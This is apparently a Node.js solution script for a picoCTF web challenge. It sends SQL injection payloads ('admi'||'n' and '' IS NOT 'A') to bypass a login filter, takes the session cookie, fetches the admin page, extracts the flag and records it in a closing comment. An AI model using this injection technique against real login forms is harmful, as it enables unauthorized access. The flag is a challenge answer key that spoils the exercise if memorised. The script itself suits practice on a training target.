import fetch from 'node-fetch';


async function main() {
  const init = {
    "headers": {
      "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
      "accept-language": "ja,en-US;q=0.9,en;q=0.8",
      "cache-control": "max-age=0",
      "content-type": "application/x-www-form-urlencoded",
      "upgrade-insecure-requests": "1"
    },
    "referrer": "http://mercury.picoctf.net:21336/index.php",
    "referrerPolicy": "strict-origin-when-cross-origin",
    "method": "POST",
    "mode": "cors",
    "credentials": "include"
  };

  const username = encodeURIComponent("admi'||'n");
  const password = encodeURIComponent("' IS NOT 'A");
  const res = await fetch("http://mercury.picoctf.net:21336/index.php",
    Object.assign(init, { body: `user=${username}&pass=${password}` }));

  const text = await res.text();
  const sql_re = /(SELECT.*)<!DOC/s;
  const sql_m = sql_re.exec(text);
  process.stdout.write('Query: ' + sql_m[1] + '\n');

  const res_re = /not admin/;
  if (res_re.test(text)) {
    throw "SQL injection failed";
  }

  const cookie_re = /(.*);/;
  const cookie_m = cookie_re.exec(res.headers.get('set-cookie'));
  const phpsessid = cookie_m[1];
  process.stdout.write('Cookie: ' + phpsessid + '\n');

  const cookie_headers = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "ja,en-US;q=0.9,en;q=0.8",
    "cache-control": "max-age=0",
    "content-type": "application/x-www-form-urlencoded",
    "upgrade-insecure-requests": "1",
    "cookie": phpsessid,
  };
  const admin_init = JSON.parse(JSON.stringify(init));
  admin_init.headers = cookie_headers;
  admin_init.method = "GET";
  admin_init.body = undefined;
  await fetch("http://mercury.picoctf.net:21336/filter.php", admin_init)
    .then((res) => {
      return res.text();
    })
    .then((text) => {
      const flag_re = /picoCTF{.*}/;
      const flag_m = flag_re.exec(text);
      console.log(flag_m[0]);
      // console.log(text);
    });
}

main();


// picoCTF{0n3_m0r3_t1m3_838ec9084e6e0a65e4632329e7abc585}
